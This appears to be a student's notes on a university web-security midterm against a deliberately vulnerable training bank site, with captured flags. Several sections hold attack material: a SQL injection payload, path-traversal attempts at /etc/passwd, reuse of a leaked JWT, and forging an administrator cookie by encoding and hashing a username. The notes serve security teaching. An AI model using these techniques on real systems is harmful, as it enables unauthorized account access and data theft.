@@ -1,0 +1,122 @@
+q1.midterm.quoccabank.com
+
+- looked at source code
+
+- found token in source code: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNDQ5MzUwMS03MWViLTRlYWQtYTYyNi1iNTcwMzRmYTAxMDkiLCJuYW1lIjoiTWVtZSBTaXRlIiwiaWF0IjoxNTE2MjM5MDIyLCJzY29wZXMiOlsibWVtZXMiLCJmbGFnIl0sImFsbG93ZWRfZW5kcG9pbnRzIjpbIi9hcGkiLCIvYXBpL21lbWVzIiwiL2FwaS9mbGFnIl19.9qXavw7NcnA_Z0oe0Q4ac9Aup8cJaGrcl5G5wTxvELQ
+
+- input into jwt.io and got payload: 
+{
+  "sub": "24493501-71eb-4ead-a626-b57034fa0109",
+  "name": "Meme Site",
+  "iat": 1516239022,
+  "scopes": [
+    "memes",
+    "flag"
+  ],
+  "allowed_endpoints": [
+    "/api",
+    "/api/memes",
+    "/api/flag"
+  ]
+}
+
+- entered /api endpoint
+
+- entered /api/flag and got: {"msg":"missing or wrongly formatted Authorization header"}
+
+- the request and response for Authorization header but couldn't find.
+
+- realised it needed to be added
+
+- went back to main page to get: Authorization: "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNDQ5MzUwMS03MWViLTRlYWQtYTYyNi1iNTcwMzRmYTAxMDkiLCJuYW1lIjoiTWVtZSBTaXRlIiwiaWF0IjoxNTE2MjM5MDIyLCJzY29wZXMiOlsibWVtZXMiLCJmbGFnIl0sImFsbG93ZWRfZW5kcG9pbnRzIjpbIi9hcGkiLCIvYXBpL21lbWVzIiwiL2FwaS9mbGFnIl19.9qXavw7NcnA_Z0oe0Q4ac9Aup8cJaGrcl5G5wTxvELQ"}
+
+- turned on intercept on burp suite to forward with Authorization token:
+GET /api/flag HTTP/2
+Host: q1.midterm.quoccabank.com
+Pragma: no-cache
+Cache-Control: no-cache
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIyNDQ5MzUwMS03MWViLTRlYWQtYTYyNi1iNTcwMzRmYTAxMDkiLCJuYW1lIjoiTWVtZSBTaXRlIiwiaWF0IjoxNTE2MjM5MDIyLCJzY29wZXMiOlsibWVtZXMiLCJmbGFnIl0sImFsbG93ZWRfZW5kcG9pbnRzIjpbIi9hcGkiLCIvYXBpL21lbWVzIiwiL2FwaS9mbGFnIl19.9qXavw7NcnA_Z0oe0Q4ac9Aup8cJaGrcl5G5wTxvELQ
+Sec-Ch-Ua: "Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"
+Sec-Ch-Ua-Mobile: ?1
+Sec-Ch-Ua-Platform: "Android"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: none
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9 
+
+- got flag: {"flag":"COMP6443{wait_was_that_meant_to_be_secret_z5361001_9njQJvRwlQ7jsmu4lQ_h}"}
+
+q2.midterm.quoccabank.com
+
+- opened 'https://q2.midterm.quoccabank.com/view/Re:%20apostrophes/' and thought thought of using apostrophe's in post titles.
+
+- also noticed url can inject sql after /view/
+
+- tested this payload: ' OR '1'='1'; -- test
+
+- got flag: COMP6443{hey_you_shouldn't_be_reading_this!_z5361001_5u5NdF9mnUQsxebYlRbc}
+
+q3.midterm.quoccabank.com
+
+- opened 'our new site' and 'file browser' hyper links
+
+- checked www.quoccabank.com source code but nothing of note.
+
+- checked https://q3.midterm.quoccabank.com/pages/flag.html' and get a 403 error meaning we need to acquire permissions somehow.
+
+- tried accessing q3.midterm.quoccabank.com/ with endpoints robots.txt, etc/passwd, etc/passwd%00 and ../../../etc.passwd. none of these worked.
+
+- tried reading through source code for all pages, including translation ones but nothing.
+
+- tried accessing q3.midterm..../admin, q3.midterm..../admin.php, q3.midterm..../pages/admin, q3.midterm..../pages/admin.php but nothing.
+
+- also tried ../../../flag.html but nothing.
+
+- tried this url but got taken back to main page: https://q3.midterm.quoccabank.com/?pages=flag.html.
+
+- tried .htaccess but 403 errror.
+
+- tried sending different types of http requests like HEAD and OPTIONS but nothing
+
+q4.midterm.quoccabank.com
+
+- opened site.
+
+- tried username: 'admin' and password: 'admin' and successfully logged in.
+
+- notcied username: 'grayons' and password: 'ilovesoy22' and retried with new credentials but didn't log in.
+
+- noticed "more important passwords are stored on the administrator account" so checked the cookies.
+
+- found this cookie value: db69fc039dcbd2962cb4d28f5891aae1 and realised it's an md5 encryption.
+
+- md5 decrypted cookie value is: YWRtaW4= and realised it's base64 encoding.
+
+- base64 decoded cookie value is: admin
+
+- now changed the decoded value to: administrator and then encoded with base64: YWRtaW5pc3RyYXRvcg== and encrypted with md5: a388d651b731a2bec4ffabee81a05f60 in that order.
+
+- new cookie value is: a388d651b731a2bec4ffabee81a05f60
+
+- replaced cookie and got flag: COMP6443{i_thought_hashes_made_things_secure_z5361001_jg6dyRKFCSboBiz9HzeV}
+
+
+q5.midterm.quoccabank.com
+
+- opened site.
+
+- looked at source code.
+
+- noticed this comment: 'to fill in your info from your github profile click <a id="load">here</a>'
+                        // will this add multiple event listeners? probably
+
+- 
+
+q6.midterm.quoccabank.com
+
+
